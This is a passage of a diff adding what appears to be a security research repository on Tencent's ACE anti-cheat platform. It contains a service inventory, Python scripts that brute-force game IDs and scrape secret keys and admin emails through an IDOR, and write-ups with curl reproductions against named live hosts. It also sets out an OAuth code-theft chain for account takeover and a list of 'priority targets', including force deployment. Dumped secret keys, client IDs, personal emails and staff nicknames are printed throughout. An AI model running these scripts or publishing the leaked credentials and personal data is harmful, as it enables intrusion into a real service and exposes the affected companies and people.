+| 2592 | puv_record (was no-auth, now fixed/down) |
+| 2593 | Sibling of 2592 (frontend 404, CGI no auth → 500) |
+| 2831 | Unknown |
+
+## Forbidden (403 frontend)
+
+| ibox | CGI Auth | Notes |
+|------|----------|-------|
+| 2011 | **No** (500) | Unknown |
+| 2051 | **No** (500) | Unknown |
+| 2110 | Yes (401) | Properly gated |
+| 2139 | Yes (401) | Coincidence with PUBG channel ID |
+| 2218 | **No** (500) | Unknown |
+| 2465 | Yes (401) | Properly gated |
+| 2643 | **No** (500) | Unknown |
+
+## Special / Indirect
+
+| ibox | Type | Notes |
+|------|------|-------|
+| 2357 | Replay CGI backend | Separate path `/replay/cgi/`, same broken gateway |
+| 2556 | Shell Hardening | Referenced as `service_id` in file uploads |
+| 2774 | Bad Gateway | Returns 502 |
+| 3311 | Audit/Report | `reportUrl: "/ibox_3311/cgi/audit/report"` |
+
+## Decommissioned (404)
+
+| ibox | Was | Notes |
+|------|-----|-------|
+| 1914 | OAuth callback (QQ/WeCom) | Removed between sessions |
+| 2084 | Lowcode proxy (SSRF) | Removed |
+| 2279 | Lowcode proxy (SSRF) | Removed |
+
+## Key Service Details
+
+### ibox_2913 — CDN Feature Publishing
+- Routes: `/cdn-pub`, `/idip-pub`, `/svrsdk-pub`, `/feature-pub-history`
+- APIs: `feature_deployment`, `feature_force_deploy` (bypass rollout), `base/staff_info`
+- Backend: `upload_dat.py` (Python), service ID 2931
+- Publishes mrpcs/dat with gray-limit (% rollout), SMS/email to staff
+
+### ibox_2094 — PC Game Security Console
+- Routes: `/sdk-download`, `/realtime-data`, `/usercheat-query`, `/sample-check`, `/cheat-monitor`
+- APIs: `ace_sdk/download/default`, `ace_sdk/download/update_sdk`, `getTVMConfigToolUrl`, `download_pack_tool`, `upload_std_file` (.zip/.exe, service_id 2556)
+- Frontend: `cloud_2094_oper` (build 2608271105)
+
+### ibox_2262 — Replay Operations Platform
+- 66 REST API endpoints under `/api/v1/`
+- Monaco editor + Tencent CodeBuddy AI Copilot (v2.16.1)
+- Git integration: `push_code_to_git`, `sync_git_code`
+- COS/CFS file management, WebIDE (工蜂 iframe)
+- Model training/evaluation/deployment pipeline
+- `/api/v1/gongfeng_ai/token` — AI auth token
+- `/api/v1/plat_info/game_list` — full game list
+- REST endpoints properly auth-gated (401)
+
+### ibox_2136 — Permission System
+- 15 CGI endpoints: `_set_cookie`, `auth_group`, `auth/api/rate_limit/rule/{create,delete,query,update}`, `get_ibox_app`, `service_info`, `nocode/get_area`
+- `nocode/get_area` returns 401 (live backend)
+
+## Gateway Status
+
+The entire ibox nginx/1.27.0 gateway returns 500 as of 2026-09-02. Infrastructure-level outage (possibly triggered by scan traffic). All 21 no-auth services become testable when it recovers.
+
+```
+
+`infrastructure/oauth_flow.md`:
+
+```md
+# OAuth Flow Analysis
+
+## QQ OAuth
+
+| Field | Value |
+|-------|-------|
+| AppId | `101531192` |
+| Callback | `https://mtp.qq.com/ibox_1914/cgi/qqcallback` |
+| Status | **Decommissioned** (ibox_1914 → 404) |
+
+QQ OAuth (`graph.qq.com`) strictly validates `redirect_uri`. Fragment injection, subdomain bypass, path traversal all rejected.
+
+## Gongfeng (工蜂) OAuth — VULNERABLE
+
+| Field | Value |
+|-------|-------|
+| Prod client_id | `d15f1aada3db4be2be622afed0019a29` |
+| Test client_id | `3c457707400c4e6c98f019536c9ad2d7` |
+| OAuth server | `git.woa.com` (internal) |
+| Token type | `oauthAccess` |
+| Auth headers | `X-Username`, `OAUTH-TOKEN` |
+
+### Callbacks
+
+**Production** (`assets.code.tencent.com/common/oauth/callback.html`):
+- Validates `state` against `allowed-origin.json`
+- Posts code only to validated origin
+
+**Development** (`assets.code.tencent.com/common/oauth/callback-dev.html`):
+- `window.opener.postMessage({code}, '*')` — **NO VALIDATION**
+- Public CDN, `Access-Control-Allow-Origin: *`, no CSP
+
+### Allowed Origins (leaked)
+
+```json
+[
+  "https://lego2bbeta.woa.com",
+  "https://lego2b.woa.com",
+  "https://devops.woa.com",
+  "https://zhiyan.woa.com",
+  "https://expt.woa.com",
+  "https://hlego.woa.com",
+  "https://codecraft.weixin.woa.com",
+  "https://lite-playground.weixin.woa.com",
+  "https://gongfeng-copilot-monaco.pages.woa.com",
+  "http://cms.video.cloud.cctv.com"
+]
+```
+
+## WeCom OAuth
+
+| Field | Value |
+|-------|-------|
+| Callback | `ibox_1914/cgi/weworkcallback` |
+| Status | **Decommissioned** (404) |
+
+## Login Flow
+
+- Tencent Turing CAPTCHA (`TJNCaptcha-global.js`)
+- Login center: `login.auth.sgp.anticheatexpert.com`
+- Internal: `login.auth.ace.woa.com` (HTTP!)
+- Auth options: WeChat, QQ, OA
+
+## Cookie Structure
+
+| Cookie | Purpose | Expiry |
+|--------|---------|--------|
+| ibox_auth_user_token | Session token (~500 hex chars) | 7 days |
+| ibox_auth_user_id | Email | 7 days |
+| ibox_auth_user_name | Email | 7 days |
+| ibox_auth_source | `AccountLogin` | 7 days |
+| D_CK | Numeric session | Session |
+| af8e8a5b95037d16 | URL-encoded blob | Session |
+| TDC_itoken | `{uid}:{timestamp}` | 1 year |
+| ace_lang | `en` | 1 year |
+
+```
+
+`scripts/ace_cdn_enum.py`:
+
+```py
+#!/usr/bin/env python3
+"""Enumerate ACE CDN channels and download config manifests."""
+
+import argparse
+import http.client
+import json
+import ssl
+import sys
+import xml.etree.ElementTree as ET
+
+CDN_HOST = "dl.listdl.com"
+CTX = ssl._create_unverified_context()
+
+KNOWN_CHANNELS = [
+    (2131, "PUBG Mobile (Chinese)"),
+    (2139, "PUBG Mobile (Global)"),
+    (2152, "Call of Duty Mobile (Chinese)"),
+    (2202, "PUBG Mobile (Vietnam)"),
+    (2244, "PUBG Mobile (Taiwan)"),
+    (2257, "Call of Duty Mobile (Global)"),
+    (2292, "Call of Duty Mobile (Garena)"),
+    (2297, "Call of Duty Mobile (Korea)"),
+    (2352, "Call of Duty Mobile (Vietnam)"),
+    (2487, "Arena Breakout (Global)"),
+    (2577, "Honor of Kings (Chinese)"),
+    (2915, "Delta Force Mobile"),
+    (6139, "PUBG Mobile (Korea/Japan)"),
+    (8888, "ACE Test"),
+    (10039, "Delta Force (Garena)"),
+    (20714, "Arena Breakout (newer)"),
+    (29001, "Free Fire"),
+]
+
+def fetch(host, path):
+    try:
+        conn = http.client.HTTPSConnection(host, timeout=15, context=CTX)
+        conn.request("GET", path)
+        resp = conn.getresponse()
+        body = resp.read()
+        conn.close()
+        return resp.status, body
+    except Exception as e:
+        return 0, str(e).encode()
+
+def parse_config2(xml_bytes):
+    games = []
+    try:
+        root = ET.fromstring(xml_bytes)
+        for game in root.findall(".//game"):
+            entry = {"attributes": dict(game.attrib), "files": []}
+            for child in game:
+                entry["files"].append({"tag": child.tag, "attributes": dict(child.attrib)})
+            games.append(entry)
+    except ET.ParseError:
+        pass
+    return games
+
+def main():
+    parser = argparse.ArgumentParser(description="ACE CDN channel enumerator")
+    parser.add_argument("--platform", "-p", default="ios", choices=["ios", "android", "win"])
+    parser.add_argument("--output", "-o", default="cdn_enum.json")
+    parser.add_argument("--channels", nargs="+", type=int, help="Specific channel IDs")
+    args = parser.parse_args()
+
+    channels = args.channels or [c for c, _ in KNOWN_CHANNELS]
+    channel_names = {c: n for c, n in KNOWN_CHANNELS}
+    results = []
+
+    print(f"[*] Enumerating {len(channels)} channels on platform={args.platform}")
+
+    for ch in channels:
+        path = f"/iedsafe/Client/{args.platform}/{ch}/config2.xml"
+        status, body = fetch(CDN_HOST, path)
+        name = channel_names.get(ch, "Unknown")
+
+        if status == 200:
+            games = parse_config2(body)
+            file_count = sum(len(g["files"]) for g in games)
+            print(f"[+] ch={ch} ({name}): {len(games)} games, {file_count} files")
+            results.append({
+                "channel": ch,
+                "game": name,
+                "platform": args.platform,
+                "status": status,
+                "game_count": len(games),
+                "file_count": file_count,
+                "games": games,
+            })
+        else:
+            print(f"[-] ch={ch} ({name}): HTTP {status}")
+
+    with open(args.output, "w") as f:
+        json.dump(results, f, indent=2)
+
+    total_files = sum(r["file_count"] for r in results)
+    print(f"\n[*] Done. {len(results)} live channels, {total_files} total files. Saved to {args.output}")
+
+if __name__ == "__main__":
+    main()
+
+```
+
+`scripts/ace_gameid_brute.py`:
+
+```py
+#!/usr/bin/env python3
+"""Async brute-force game_id via no-auth puv_record. Adaptive dead-range skipping."""
+
+import asyncio
+import json
+import ssl
+import sys
+import time
+from urllib.request import Request, urlopen
+from urllib.error import URLError
+from concurrent.futures import ThreadPoolExecutor
+
+HOST = "https://intl.anticheatexpert.com"
+ENDPOINT = "/ibox_2592/cgi/puv_record"
+CTX = ssl._create_unverified_context()
+
+DEFAULT_RANGES = [
+    (1, 1000),
+    (1000, 5000),
+    (5000, 10000),
+    (10000, 25000),
+    (24000, 24375),
+    (25000, 50000),
+    (6090000, 6100000),
+]
+
+DEAD_THRESHOLD = 50
+BOUNDARY_THRESHOLD = 200
+
+def check_id(game_id):
+    try:
+        req = Request(
+            f"{HOST}{ENDPOINT}",
+            data=f"game_id={game_id}".encode(),
+            headers={
+                "Content-Type": "application/x-www-form-urlencoded",
+                "Ibox-Request-Trace": "bw==",
+            },
+            method="POST",
+        )
+        resp = urlopen(req, timeout=10, context=CTX)
+        body = resp.read().decode()
+        data = json.loads(body)
+        return game_id, data.get("code", -1) == 0
+    except Exception:
+        return game_id, False
+
+def scan_range(start, end, live_ids, executor):
+    consecutive_miss = 0
+    found_any = False
+    count = 0
+    t0 = time.time()
+
+    for gid in range(start, end + 1):
+        future = executor.submit(check_id, gid)
+        gid_result, is_live = future.result()
+        count += 1
+
+        if is_live:
+            live_ids.append(gid_result)
+            consecutive_miss = 0
+            found_any = True
+            print(f"  [+] {gid_result} LIVE")
+        else:
+            consecutive_miss += 1
+
+        if not found_any and consecutive_miss >= DEAD_THRESHOLD:
+            elapsed = time.time() - t0
+            rps = count / elapsed if elapsed > 0 else 0
+            print(f"  [.] {start}-{end}: {count}/{end-start+1} dead={consecutive_miss} ~{rps:.0f}rps SKIP")
+            return
+
+        if found_any and consecutive_miss >= BOUNDARY_THRESHOLD:
+            elapsed = time.time() - t0
+            rps = count / elapsed if elapsed > 0 else 0
+            print(f"  [.] {start}-{end}: {count}/{end-start+1} live={len(live_ids)} boundary ~{rps:.0f}rps STOP")
+            return
+
+        if count % 500 == 0:
+            elapsed = time.time() - t0
+            rps = count / elapsed if elapsed > 0 else 0
+            print(f"  [.] {start}-{end}: {count}/{end-start+1} live={len(live_ids)} ~{rps:.0f}rps")
+
+def main():
+    output = "live_game_ids.json"
+    if len(sys.argv) > 1:
+        output = sys.argv[1]
+
+    print(f"[*] ACE game_id brute-force (no auth)")
+    print(f"[*] {len(DEFAULT_RANGES)} ranges, adaptive skipping")
+    print(f"[*] Dead threshold: {DEAD_THRESHOLD}, boundary: {BOUNDARY_THRESHOLD}\n")
+
+    all_live = []
+    executor = ThreadPoolExecutor(max_workers=10)
+
+    for start, end in DEFAULT_RANGES:
+        before = len(all_live)
+        print(f"[>] Range {start}-{end} ({end-start+1} IDs)")
+        scan_range(start, end, all_live, executor)
+        found = len(all_live) - before
+        print(f"    Found {found} live in this range\n")
+
+    executor.shutdown()
+
+    result = {
+        "scan_date": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
+        "ranges_scanned": [f"{s}-{e}" for s, e in DEFAULT_RANGES],
+        "total_live": len(all_live),
+        "ids": sorted(all_live),
+    }
+
+    with open(output, "w") as f:
+        json.dump(result, f, indent=2)
+
+    print(f"[*] Done. {len(all_live)} live IDs saved to {output}")
+
+if __name__ == "__main__":
+    main()
+
+```
+
+`scripts/ace_gateway_monitor.py`:
+
+```py
+#!/usr/bin/env python3
+"""Monitor ibox gateway recovery. Polls key endpoints every 60s, alerts on status change."""
+
+import http.client
+import json
+import ssl
+import sys
+import time
+from datetime import datetime
+
+TARGETS = [
+    ("/ibox_2592/cgi/", "puv_record gateway"),
+    ("/ibox_2913/cgi/", "CDN publish gateway"),
+    ("/ibox_2094/cgi/", "PC security gateway"),
+    ("/ibox_2136/cgi/", "permission system"),
+]
+
+HOST = "intl.anticheatexpert.com"
+CTX = ssl._create_unverified_context()
+
+last_status = {}
+
+def check(path):
+    try:
+        conn = http.client.HTTPSConnection(HOST, timeout=10, context=CTX)
+        conn.request("POST", path, body="{}", headers={
+            "Content-Type": "application/json",
+        })
+        resp = conn.getresponse()
+        body = resp.read(512).decode("utf-8", errors="replace")
+        conn.close()
+        return resp.status, body[:200]
+    except Exception as e:
+        return 0, str(e)
+
+def main():
+    print(f"[*] ACE ibox gateway monitor started at {datetime.now().isoformat()}")
+    print(f"[*] Watching {len(TARGETS)} endpoints on {HOST}")
+    print(f"[*] Polling every 60s. Ctrl+C to stop.\n")
+
+    while True:
+        ts = datetime.now().strftime("%H:%M:%S")
+        changes = []
+        for path, label in TARGETS:
+            code, body = check(path)
+            prev = last_status.get(path)
+            if prev is not None and prev != code:
+                changes.append((label, prev, code, body))
+            last_status[path] = code
+
+        if changes:
+            print(f"\n{'='*60}")
+            print(f"[!!!] STATUS CHANGE at {datetime.now().isoformat()}")
+            for label, old, new, body in changes:
+                print(f"  {label}: {old} -> {new}")
+                if new != 500 and new != 0:
+                    print(f"  Body: {body}")
+            print(f"{'='*60}\n")
+        else:
+            statuses = " | ".join(f"{l}={last_status[p]}" for p, l in TARGETS)
+            print(f"[.] {ts} {statuses}")
+
+        time.sleep(60)
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        print("\n[*] Stopped.")
+
+```
+
+`scripts/ace_idor_scan.py`:
+
+```py
+#!/usr/bin/env python3
+"""Scan game_id ranges for IDOR: extract secret_key, admin email, services."""
+
+import argparse
+import http.client
+import json
+import os
+import ssl
+import sys
+import time
+
+HOST = "intl.anticheatexpert.com"
+CTX = ssl._create_unverified_context()
+
+DEFAULT_RANGES = [
+    (24000, 24375),
+    (6095000, 6095085),
+]
+
+def post_json(path, body, cookies):
+    conn = http.client.HTTPSConnection(HOST, timeout=15, context=CTX)
+    conn.request("POST", path, body=json.dumps(body), headers={
+        "Content-Type": "application/json",
+        "Cookie": cookies,
+    })
+    resp = conn.getresponse()
+    data = resp.read().decode("utf-8", errors="replace")
+    conn.close()
+    try:
+        return resp.status, json.loads(data)
+    except json.JSONDecodeError:
+        return resp.status, {"raw": data[:500]}
+
+def scan_game(game_id, cookies):
+    result = {"game_id": game_id}
+
+    code18, data18 = post_json("/cgi/game_info", {
+        "game_id": str(game_id), "page_type": "18"
+    }, cookies)
+    if code18 == 200 and isinstance(data18, dict):
+        info = data18.get("info", {})
+        if isinstance(info, dict):
+            result["secret_key"] = info.get("secret_key", "")
+            result["secret_id"] = info.get("secret_id", "")
+
+    time.sleep(0.05)
+
+    code21, data21 = post_json("/cgi/game_info", {
+        "game_id": str(game_id), "page_type": "21"
+    }, cookies)
+    if code21 == 200 and isinstance(data21, dict):
+        info = data21.get("info", {})
+        if isinstance(info, dict):
+            result["admin"] = info.get("admin", "")
+            result["services"] = info.get("service_list", [])
+            result["buyer"] = info.get("buyer", "")
+
+    return result
+
+def main():
+    parser = argparse.ArgumentParser(description="ACE IDOR scanner")
+    parser.add_argument("--cookies", default=os.environ.get("ACE_COOKIES", ""),
+                        help="Cookie header value (or set ACE_COOKIES env)")
+    parser.add_argument("--output", "-o", default="idor_results.json")
+    parser.add_argument("--ranges", nargs="+", help="start-end pairs, e.g. 24000-24375")
+    args = parser.parse_args()
+
+    if not args.cookies:
+        print("[!] No cookies. Set ACE_COOKIES env or use --cookies", file=sys.stderr)
+        sys.exit(1)
+
+    ranges = DEFAULT_RANGES
+    if args.ranges:
+        ranges = []
+        for r in args.ranges:
+            s, e = r.split("-")
+            ranges.append((int(s), int(e)))
+
+    total = sum(e - s + 1 for s, e in ranges)
+    print(f"[*] Scanning {total} game IDs across {len(ranges)} ranges")
+
+    results = []
+    hits = 0
+    scanned = 0
+
+    for start, end in ranges:
+        for gid in range(start, end + 1):
+            scanned += 1
+            r = scan_game(gid, args.cookies)
+            if r.get("secret_key") or r.get("admin"):
+                hits += 1
+                results.append(r)
+                sk = r.get("secret_key", "")[:16]
+                adm = r.get("admin", "")[:30]
+                print(f"[+] {gid}: key={sk}... admin={adm}")
+            if scanned % 25 == 0:
+                print(f"[.] {scanned}/{total} scanned, {hits} hits")
+            time.sleep(0.1)
+
+    with open(args.output, "w") as f:
+        json.dump({"total_scanned": scanned, "hits": hits, "results": results}, f, indent=2)
+
+    print(f"\n[*] Done. {hits}/{scanned} hits. Saved to {args.output}")
+
+if __name__ == "__main__":
+    main()
+
+```
+
+`vulnerabilities/01_idor_secret_keys.md`:
+
+```md
+# ACE-2024-01: IDOR — Game Secret Keys Disclosure
+
+**Severity:** CRITICAL
+**Status:** Confirmed (93 keys dumped)
+**Date:** 2026-09-01
+
+## Endpoint
+
+```
+POST https://intl.anticheatexpert.com/cgi/game_info
+Content-Type: application/json
+Cookie: <any authenticated session>
+```
+
+## Request
+
+```json
+{"game_id": "24011", "page_type": "18"}
+```
+
+## Response (truncated)
+
+```json
+{
+  "ret": 0,
+  "info": {
+    "secret_key": "59fd5e0a91c4db06705d11a3c17011a8",
+    "secret_id": "3805C9C21D515E26",
+    "game_id": 24011,
+    ...
+  }
+}
+```
+
+## Prerequisites
+
+- Any registered account on `intl.anticheatexpert.com` (even unactivated, no game binding required)
+- Valid session cookies (`ibox_auth_user_token`, `af8e8a5b95037d16`, etc.)
+
+## Reproduction
+
+```bash
+curl -sk -X POST https://intl.anticheatexpert.com/cgi/game_info \
+  -H "Content-Type: application/json" \
+  -H "Cookie: ibox_auth_user_token=<TOKEN>; af8e8a5b95037d16=<SESSION>" \
+  -d '{"game_id":"24011","page_type":"18"}'
+```
+
+Iterate `game_id` over ranges 24000-24375 and 6095000-6095085 to dump all.
+
+## Impact
+
+- **93 API secret keys** extracted across 450+ registered games
+- `secret_key` + `secret_id` are the credentials passed to `AnoSDKInit()` — the anti-cheat initialization call in every protected game
+- An attacker can impersonate any game's anti-cheat client, potentially:
+  - Submitting fake telemetry reports
+  - Receiving detection rules meant for that game
+  - Interfering with the game's anti-cheat configuration
+
+## Affected Clients
+
+EA, Mihoyo/HoYoverse, Hypergryph (Arknights), Scopely, Ubisoft, Nexon, Netmarble, Cygames, NCsoft, Bilibili (5 studios), Pocketpair (Palworld), My.Games, Garena, Com2us, and others.
+
+## Remediation
+
+- Enforce game-level authorization: `page_type=18` should only return data for games the authenticated user owns
+- Rate-limit `/cgi/game_info` per session
+- Rotate all exposed `secret_key` values
+
+```
+
+`vulnerabilities/02_idor_admin_data.md`:
+
+```md
+# ACE-2024-02: IDOR — Admin Data & Client Information Disclosure
+
+**Severity:** CRITICAL
+**Status:** Confirmed (450+ games enumerated)
+**Date:** 2026-09-01
+
+## Endpoint
+
+```
+POST https://intl.anticheatexpert.com/cgi/game_info
+Content-Type: application/json
+Cookie: <any authenticated session>
+```
+
+## Request
+
+```json
+{"game_id": "24011", "page_type": "21"}
+```
+
+## Response (truncated)
+
+```json
+{
+  "ret": 0,
+  "info": {
+    "admin": "386092898@qq.com",
+    "buyer": "v_xheliang",
+    "service_list": [
+      {
+        "service_name": "ios_anti_cheat_pro",
+        "purchase_date": "2024-03-15",
+        "deadline": "2050-12-31",
+        "status": 1
+      }
+    ]
+  }
+}
+```
+
+## Prerequisites
+
+Same as ACE-2024-01: any authenticated session, no game binding required.
+
+## Reproduction
+
+```bash
+curl -sk -X POST https://intl.anticheatexpert.com/cgi/game_info \
+  -H "Content-Type: application/json" \
+  -H "Cookie: ibox_auth_user_token=<TOKEN>; af8e8a5b95037d16=<SESSION>" \
+  -d '{"game_id":"24011","page_type":"21"}'
+```
+
+## Impact
+
+- **450+ games** fully enumerated
+- **254 unique admin email addresses** exposed (personal and corporate)
+- **28 @tencent.com internal addresses** (Tencent employee emails)
+- **16 internal dev-nicknames** (buyers): `v_hhgfhuang`, `v_lmjielong`, `v_xheliang`, `v_xinxindai`, etc.
+- Full **service list** per game: service names, purchase dates, deadlines, statuses
+- Contract details (service deadlines extending to 2050)
+- Internal organizational structure of Tencent's ACE team visible through buyer names
+
+## Data Exposure Summary
+
+| Category | Count |
+|----------|-------|
+| Games enumerated | 450+ |
+| Unique admin emails | 254 |
+| @tencent.com emails | 28 |
+| Internal buyer nicks | 16 |
+| Service records | ~1,800 |
+
+## Remediation
+
+- Enforce game-level authorization for `page_type=21`
+- Admin emails and buyer names should never be visible to non-owners
+- Audit all `page_type` values (1-30+) for similar IDOR patterns
+
+```
+
+`vulnerabilities/03_oauth_code_theft.md`:
+
+```md
+# ACE-2024-03: OAuth Code Theft via Dev Callback
+
+**Severity:** CRITICAL
+**Status:** Confirmed (callback accessible, attack chain validated)
+**Date:** 2026-09-02
+
+## Vulnerable Component
+
+```
+https://assets.code.tencent.com/common/oauth/callback-dev.html
+```
+
+## Vulnerability
+
+The dev OAuth callback sends the authorization code to **any opener origin** via `postMessage`:
+
+```javascript
+// callback-dev.html (simplified)
+window.opener.postMessage({ code: urlParams.get('code') }, '*');
+```
+
+The production callback (`callback.html`) validates the opener's origin against an allowlist in `allowed-origin.json` before sending the code. The dev callback **skips all validation**.
+
+## Security Headers (callback-dev.html)
+
+```
+Access-Control-Allow-Origin: *
+X-Frame-Options: (missing)
+Content-Security-Policy: (missing)
+```
+
+## Leaked OAuth Credentials
+
+| Parameter | Value |
+|-----------|-------|
+| Prod client_id | `d15f1aada3db4be2be622afed0019a29` |
+| Test client_id | `3c457707400c4e6c98f019536c9ad2d7` |
+| OAuth server | `git.woa.com` (Tencent internal Gongfeng/GitLab) |
+| Token proxy | `copilot.code.woa.com` |
+| Auth headers | `X-Username`, `OAUTH-TOKEN` (type: `oauthAccess`) |
+
+## Leaked Allowed Origins
+
+`allowed-origin.json` (publicly readable):
+
+```
+lego2bbeta.woa.com, lego2b.woa.com, devops.woa.com, zhiyan.woa.com,
+expt.woa.com, hlego.woa.com, codecraft.weixin.woa.com,
+lite-playground.weixin.woa.com, gongfeng-copilot-monaco.pages.woa.com,
+cms.video.cloud.cctv.com (HTTP!)
+```
+
+## Attack Scenario
+
+1. Attacker hosts a page that opens a popup:
+   ```
+   git.woa.com/oauth/authorize
+     ?client_id=d15f1aada3db4be2be622afed0019a29
+     &redirect_uri=https://assets.code.tencent.com/common/oauth/callback-dev.html
+     &response_type=code
+   ```
+2. Tencent employee (on internal network, logged into git.woa.com) visits attacker's page
+3. Popup redirects through OAuth flow → lands on callback-dev.html with `?code=...`
+4. callback-dev.html does `postMessage({code}, '*')` → code sent to attacker's page
+5. Attacker exchanges code for access token → **full Gongfeng git account takeover**
+
+## Limitations
+
+- Victim must be on Tencent internal network (git.woa.com is not reachable from the public internet)
+- Victim must be logged into git.woa.com
+- Requires social engineering to get victim to visit attacker's page
+
+## Verification
+
+```bash
+# Confirm dev callback is publicly accessible
+curl -sk -I https://assets.code.tencent.com/common/oauth/callback-dev.html
+
+# Confirm allowed-origin.json is readable
+curl -sk https://assets.code.tencent.com/common/oauth/allowed-origin.json
+```
+
+## Remediation
+
+- Remove `callback-dev.html` from public CDN
+- Remove `allowed-origin.json` from public CDN (leaks internal domain inventory)
+- Enforce strict redirect_uri validation on the OAuth server (git.woa.com) — only allow production callback
+
+```
+
+`vulnerabilities/04_no_auth_ibox_gateway.md`:
+
+```md
+# ACE-2024-04: 21 ibox Microservices Without Authentication on CGI
+
+**Severity:** HIGH
+**Status:** Confirmed (500 not 401), currently blocked by gateway outage
+**Date:** 2026-09-02
+
+## Vulnerability
+
+21 out of 31 discovered ibox microservices return HTTP 500 (Internal Server Error) instead of 401 (Unauthorized) when POST requests are sent to their `/cgi/` endpoints without authentication cookies. This means the nginx reverse proxy forwards the request to the backend service without auth checking — the backend processes it and crashes on input parsing, not on authorization.
+
+This is the **same class of bug** that allowed `ibox_2592/cgi/puv_record` to return game data without authentication in the original finding.
+
+## Affected Services (21)
+
+| ibox_ID | Service Name | Key No-Auth Targets |
+|---------|-------------|-------------------|
+| 1973 | UGC Feedback | |
+| 2009 | UGC Access | /cgi/config, /cgi/verify |
+| 2011 | (unknown, 403 GET) | /cgi/ POST bypasses 403 |
+| 2051 | (unknown, 403 GET) | /cgi/ POST bypasses 403 |
+| 2094 | PC Game Security | **`/cgi/ace_sdk/download/default`**, `/cgi/usercheat` |
+| 2140 | Mobile Game Security | |
+| 2145 | UGC Operations | |
+| 2151 | (unknown) | |
+| 2217 | (unknown) | |
+| 2218 | (unknown, 403 GET) | /cgi/ POST bypasses 403 |
+| 2262 | Replay Ops Platform | /cgi/api/v1/replay/app/list |
+| 2309 | Anti-Cheat Console | |
+| 2358 | UGC Operations | |
+| 2378 | UGC Operations | |
+| 2412 | (unknown) | |
+| 2530 | UGC Feedback | |
+| 2555 | Data Center | /cgi/monitor, /cgi/report-config |
+| 2574 | (unknown) | |
+| 2593 | (sibling of 2592) | puv_record candidate |
+| 2643 | (unknown, 403 GET) | /cgi/ POST bypasses 403 |
+| 2647 | Mobile Game Security | /cgi/sample-cloud-detect |
+| 2732 | Data Center | |
+| 2796 | Mobile Game Security | |
+| 2913 | Feature Operations | **`/cgi/base/staff_info`**, **`/cgi/feature_deployment`**, **`/cgi/feature_force_deploy`** |
+
+## Properly Auth-Gated Services (for comparison)
+
+| ibox_ID | Status |
+|---------|--------|
+| 2110 | 401 |
+| 2139 | 401 |
+| 2465 | 401 |
+| 2491 | 401 |
+| 2592 | 401 (was 200, patched/broken) |
+| 2831 | 401 |
+
+## Current Blocker
+
+The entire ibox gateway (`nginx/1.27.0`) returns 500 on all CGI requests as of Sep 2, 2026. This is an infrastructure-level outage — the proxy itself is failing before requests reach backend services.
+
+## When Gateway Recovers — Priority Targets
+
+```bash
+# Staff info leak (CDN publishing team)
+curl -sk -X POST https://intl.anticheatexpert.com/ibox_2913/cgi/base/staff_info \
+  -H "Content-Type: application/json" -d '{}'
+
+# CDN deployment configs
+curl -sk -X POST https://intl.anticheatexpert.com/ibox_2913/cgi/feature_deployment \
+  -H "Content-Type: application/json" -d '{}'
+
+# SDK download without game binding
+curl -sk -X POST https://intl.anticheatexpert.com/ibox_2094/cgi/ace_sdk/download/default \
+  -H "Content-Type: application/json" -d '{}'
+
+# Force deploy (bypass gray rollout)
+curl -sk -X POST https://intl.anticheatexpert.com/ibox_2913/cgi/feature_force_deploy \
+  -H "Content-Type: application/json" -d '{}'
+```
+
+## Reproduction (to verify auth bypass class)
+
+```bash
+# Should return 500 (not 401) — confirms no auth check
+curl -sk -X POST https://intl.anticheatexpert.com/ibox_2913/cgi/ \
+  -H "Content-Type: application/json" -d '{}'
+```
+
+## Remediation
+
+- Add authentication middleware at the nginx proxy layer for ALL ibox services
+- Currently only 6 of 31 services enforce auth at nginx — the other 25 rely on backend auth which is inconsistent
+
+```
+
+`vulnerabilities/05_cos_bucket_leak.md`:
+
+```md
+# ACE-2024-05: COS Bucket Name Disclosure in JS
+
+**Severity:** HIGH
+**Status:** Confirmed (bucket name found, geo-restricted)
+**Date:** 2026-09-02
+
+## Vulnerability
+
+Tencent Cloud Object Storage (COS) bucket names leaked in frontend JavaScript bundles.
+
+## Leaked Buckets
+
+| Bucket | AppID | Source | Contents |
+|--------|-------|--------|----------|
+| `iegss-ugc-accessvr-1258344700` | 1258344700 | ibox_2009 JS | `system_download/ace_auth_demo.zip`, UGC HTTP integration package |
+| `domain-config-1256704386` | 1256704386 | WAF block page | WAF configuration data |
+| (unnamed)-`1786004140` | 1786004140 | SDK download path `/cos/demo/1786004140.75/` | SDK APK/ZIP files |
+
+## Full Bucket URL
+
+```
+https://iegss-ugc-accessvr-1258344700.cos.ap-guangzhou.myqcloud.com/
+```
+
+## Access Status
+
+- **Geo-restricted:** timeout from non-China IPs
+- **From China/VPN:** accessible (bucket exists, listing likely blocked)
+- Region: `ap-guangzhou` only (tested ap-singapore, ap-hongkong — no resolution)
+
+## COS Metadata from CDN Proxy
+
+`down.anticheatexpert.com` acts as a COS proxy and leaks storage headers:
+
+```
+x-cos-version-id: <version hash>
+x-cos-storage-class: STANDARD
+x-cos-replication-status: Replica
+content-type: application/x-directory
+```
+
+This confirms: versioning enabled, cross-region replication active.
+
+## Reproduction
+
+```bash
+# Verify bucket existence (from China IP or VPN)
+curl -sk --max-time 10 https://iegss-ugc-accessvr-1258344700.cos.ap-guangzhou.myqcloud.com/
+
+# COS metadata via CDN proxy
+curl -sk -I https://down.anticheatexpert.com/static/iegssibox/
+```
+
+## Impact
+
+- Bucket names enable targeted COS API attacks (ListObjects, GetBucketAcl) from within China
+- AppIDs can be used to enumerate other buckets belonging to the same Tencent Cloud account
+- Cross-region replication reveals multi-region infrastructure
+
+## Remediation
+
+- Remove hardcoded bucket URLs from frontend JS
+- Use server-side presigned URLs instead of exposing bucket names
+
+```
+
+`vulnerabilities/06_docs_no_auth.md`:
+
+```md
+# ACE-2024-06: Documentation Files Accessible Without Authentication
+
+**Severity:** HIGH
+**Status:** Confirmed
+**Date:** 2026-09-02
+
+## Vulnerable Paths
+
+| Path | Type | Size | Status |
+|------|------|------|--------|
+| `/docs/ACE-files/ugc_access/ace_scene_register_guide.pdf` | PDF | 1.14 MB | 200 |
+| `/docs/ACE-files/ugc_access/content_api_test.xlsx` | Excel | 12 KB | 200 |
+| `/doc-center/{sha1_hash}` (7 pages) | Vue SSR HTML | ~17 KB each | 200 |
+
+## Reproduction
+
+```bash
+# Download PDF without auth
+curl -sk https://intl.anticheatexpert.com/docs/ACE-files/ugc_access/ace_scene_register_guide.pdf -o guide.pdf
+
+# Download Excel without auth
+curl -sk https://intl.anticheatexpert.com/docs/ACE-files/ugc_access/content_api_test.xlsx -o test.xlsx
+```
+
+## Impact
+
